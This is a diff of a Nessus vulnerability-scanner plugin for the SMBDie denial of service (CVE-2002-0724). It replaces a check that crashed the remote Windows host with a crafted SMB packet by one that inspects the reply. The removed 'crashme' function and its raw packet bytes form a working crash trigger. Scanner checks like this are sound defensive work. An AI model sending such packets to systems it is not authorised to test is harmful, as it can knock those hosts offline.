@@ -19,9 +19,9 @@
 if(description)
 {
  script_id(11110);
- script_version ("$Revision: 1.8 $");
- script_cve_id("CAN-2002-0724");
  script_bugtraq_id(5556);
+ script_version ("$Revision: 1.14 $");
+ script_cve_id("CVE-2002-0724");
 
  name["english"] = "SMB null param count DoS";
  
@@ -29,17 +29,13 @@ if(description)
  script_name(english:name["english"]);
  
  desc["english"] = "
+The remote host is vulnerable to a denial of service attack in its SMB
+stack.
 
-It seems that is was possible to crash the remote
-windows remotely by sending a specially crafted packet.
+An attacker may exploit this flaw to crash the remote host remotely, without
+any kind of authentication.
 
-An attacker may use this flaw to prevent this host from
-working properly.
-
-This attack is known as SMBDie.
-
-
-Solution : http://www.microsoft.com/technet/security/bulletin/ms02-045.asp
+Solution : http://www.microsoft.com/technet/security/bulletin/ms02-045.mspx
 Risk factor : High";
 
 
@@ -49,9 +45,9 @@ Risk factor : High";
  summary["english"] = "crashes windows";
  script_summary(english:summary["english"]);
  
- script_category(ACT_DENIAL);
+ script_category(ACT_ATTACK);
  
- script_copyright(english:"This script is Copyright (C) 2002 Renaud Deraison");
+ script_copyright(english:"This script is Copyright (C) 2005 Tenable Network Security");
  family["english"] = "Denial of Service";
  family["francais"] = "Déni de service";
  script_family(english:family["english"], francais:family["francais"]);
@@ -67,7 +63,7 @@ include("smb_nt.inc");
 port = kb_smb_transport();
 if(!port)port = 139;
 
-function crashme(soc, uid, tid)
+function NetServerEnum2(soc, uid, tid)
 {
  uid_lo = uid % 256;
  uid_hi = uid / 256;
@@ -80,7 +76,7 @@ function crashme(soc, uid, tid)
  	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
 	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
 	0x00, 0x00, tid_lo, tid_hi, 0x24, 0x04, uid_lo, uid_hi,
-	0x00, 0x00, 0x0E, 0x13, 0x00, 0x00, 0x00, 0x00,
+	0x00, 0x00, 0x0E, 0x13, 0x00, 0x00, 0x00, 0x01,
 	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
 	0x00, 0x00, 0x00, 0x00, 0x00, 0x13, 0x00, 0x4C,
 	0x00, 0x00, 0x00, 0x5F, 0x00, 0x00, 0x00, 0x20,
@@ -95,10 +91,22 @@ function crashme(soc, uid, tid)
  n = send(socket:soc, data:req);
  if(!(n == len))exit(0);
  
- r = recv(socket:soc, length:4);
- 
- # If the remote host is vulnerable it will instantly die.
- if(!r)security_hole(port);
+ r = smb_recv(socket:soc, length:4096);
+ if (strlen (r) == 68)
+ {
+  # If the return code is STATUS_SUCCESS server can be vulnerable
+  sub = substr (r, 9, 12);
+  if ("00000000" >< hexstr (sub))
+  {
+   val = substr (r, strlen(r)-6, strlen(r)-1);
+   if ("000000000000" >< hexstr (val))
+   {
+     val = substr (r, strlen(r)-9, strlen(r)-8);
+     if ("0000" >!< hexstr(val))
+       security_hole (port);
+   }
+  }
+ }
 }
 
 
@@ -135,5 +143,5 @@ if(soc)
   r = smb_tconx(soc:soc, name:name, uid:uid, share:"IPC$");
   tid = tconx_extract_tid(reply:r);
   if(!tid)exit(0);
-  crashme(soc:soc, uid:uid, tid:tid);
+  NetServerEnum2(soc:soc, uid:uid, tid:tid);
  }
